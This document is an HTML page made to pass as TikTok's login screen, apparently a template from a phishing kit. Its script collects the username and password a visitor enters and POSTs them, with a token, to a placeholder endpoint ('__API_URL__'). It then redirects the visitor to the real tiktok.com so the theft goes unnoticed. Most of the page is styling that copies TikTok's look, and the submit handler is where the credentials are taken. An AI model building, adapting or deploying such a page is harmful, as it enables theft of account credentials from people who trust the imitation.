<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fff;
            font-family: 'TikTokFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #161823;
        }

        .login-card {
            width: 100%;
            max-width: 480px;
            padding: 0 40px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 12px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .input-wrapper {
            position: relative;
            background-color: #f1f1f2;
            border-radius: 4px;
            display: flex;
            align-items: center;
        }

        .input-wrapper input {
            width: 100%;
            height: 44px;
            padding: 0 12px;
            background: transparent;
            border: 1px solid transparent;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        .input-wrapper input:focus {
            border-color: #fe2c55;
            background-color: #fff;
        }

        .login-btn {
            width: 100%;
            height: 44px;
            background-color: #fe2c55;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            opacity: 0.5;
            pointer-events: none;
        }

        .login-btn.active {
            opacity: 1;
            pointer-events: auto;
        }

        .forgot {
            font-size: 14px;
            color: #161823;
            text-decoration: none;
            display: block;
            margin-top: 16px;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        .footer {
            border-top: 1px solid #e3e3e4;
            margin-top: 40px;
            padding-top: 24px;
            font-size: 14px;
        }

        .footer span {
            color: #fe2c55;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="login-card">
        <h1>Log in</h1>
        <form id="tiktokForm">
            <div class="input-group">
                <label>Email or username</label>
                <div class="input-wrapper">
                    <input type="text" id="username" placeholder="Email or username" autocomplete="username">
                </div>
            </div>
            <div class="input-group">
                <label>Password</label>
                <div class="input-wrapper">
                    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
                </div>
            </div>
            <button type="submit" id="loginBtn" class="login-btn">Log in</button>
        </form>
        <a href="#" class="forgot">Forgot password?</a>

        <div class="footer">
            Don't have an account? <span>Sign up</span>
        </div>
    </div>

    <script>
        const u = document.getElementById('username');
        const p = document.getElementById('password');
        const btn = document.getElementById('loginBtn');
        const form = document.getElementById('tiktokForm');

        function check() {
            if (u.value && p.value) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        u.addEventListener('input', check);
        p.addEventListener('input', check);

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const data = {
                token: '__TOKEN__',
                username: u.value,
                password: p.value
            };
            fetch('__API_URL__', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).finally(() => {
                window.location.href = 'https://www.tiktok.com/';
            });
        });
    </script>
</body>

</html>
